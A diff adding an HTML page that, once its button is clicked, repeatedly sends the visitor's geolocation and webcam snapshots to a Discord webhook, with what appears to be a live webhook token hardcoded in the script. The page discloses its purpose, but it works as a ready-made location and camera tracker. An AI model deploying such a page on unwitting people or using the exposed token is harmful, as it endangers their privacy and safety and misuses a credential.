@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Live Location & Camera to Discord</title>
+  <style>
+    body { font-family: Arial; text-align: center; margin-top: 40px; }
+    video { margin-top: 20px; border: 1px solid #ccc; }
+    button { padding: 10px 20px; margin: 10px; cursor: pointer; }
+  </style>
+</head>
+<body>
+
+  <h2>Live Location & Camera to Discord</h2>
+
+  <button onclick="startTracking()">Start Live Updates</button>
+  <video id="video" width="400" autoplay playsinline></video>
+
+  <script>
+    // ====== CONFIG ======
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1476251185315844277/JKBNjJ2LUrioTJQ6Ok1SbFyFzs2ie1mGGYqB7zzUFwKnbtab5VEx5O1otp6CZGIRUnpF";
+    const UPDATE_INTERVAL = 30000; // 30 seconds (adjust as needed)
+    let tracking = false;
+    let videoStream;
+
+    // ====== LOCATION ======
+    async function sendLocationToDiscord(latitude, longitude) {
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `📍 Current Location:\nLatitude: ${latitude}\nLongitude: ${longitude}`
+        })
+      });
+    }
+
+    function getLocationAndSend() {
+      if (!navigator.geolocation) return;
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          sendLocationToDiscord(lat, lon);
+        },
+        (err) => console.log("Location error:", err)
+      );
+    }
+
+    // ====== CAMERA ======
+    async function startCamera() {
+      try {
+        videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById("video").srcObject = videoStream;
+      } catch (err) {
+        alert("Camera permission denied or unavailable.");
+      }
+    }
+
+    function sendPhotoToDiscord() {
+      const video = document.getElementById("video");
+      if (!video.srcObject) return;
+
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob((blob) => {
+        const formData = new FormData();
+        formData.append("file", blob, "photo.png");
+        fetch(WEBHOOK_URL, { method: "POST", body: formData });
+      });
+    }
+
+    // ====== LIVE TRACKING ======
+    function startTracking() {
+      if (tracking) return;
+      tracking = true;
+
+      startCamera().then(() => {
+        getLocationAndSend();
+        sendPhotoToDiscord();
+
+        setInterval(() => {
+          getLocationAndSend();
+          sendPhotoToDiscord();
+        }, UPDATE_INTERVAL);
+
+        alert("Live updates started! Location and photos will be sent every 30 seconds.");
+      });
+    }
+  </script>
+
+</body>
+</html>
